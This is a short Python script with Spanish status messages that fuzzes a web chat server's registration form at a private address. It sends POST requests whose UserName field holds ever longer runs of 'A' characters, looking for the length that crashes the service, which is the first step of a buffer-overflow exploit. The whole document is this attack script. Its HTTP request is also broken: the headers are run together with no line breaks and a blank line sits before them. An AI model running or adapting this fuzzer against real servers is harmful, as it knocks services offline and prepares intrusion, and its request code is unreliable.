#!/usr/bin/python

import socket, sys

def explotacion():
    buffer=["A"]
    padding=100
    
    while len(buffer)<50:
        buffer.append("A"*padding)
        padding+=200
    
    
    for strings in buffer:
        print("Enviando %s bytes" % len(strings))
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('192.168.112.138',8080))
            request = "POST /registresult.htm HTTP/1.1\r\n\r\n"
            request += "Host: 192.168.1.11:8080" 
            request += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0" 
            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
            request += "Accept-Language: en-US,en;q=0.5" 
            request += "Accept-Encoding: gzip, deflate" 
            request += "Referer: http://192.168.1.11:8080/register.ghp" 
            request += "Connection: close"
            request += "Content-Type: application/x-www-form-urlencoded" 
            request += "UserName=" + strings +"&Password=test&Password1=test&Sex=1&Email=x@&Icon=x.gif&Resume=xxxx&cw=1&RoomID=4&RepUserName=admin&submit1=Register"
            s.send(request)
            data = s.recv(4096)
            print(data)
            s.close()
        except:
            print("\n[!] Ha ocurrido un error en la conexion\n")
            sys.exit(1)
    
if __name__=="__main__":
    explotacion()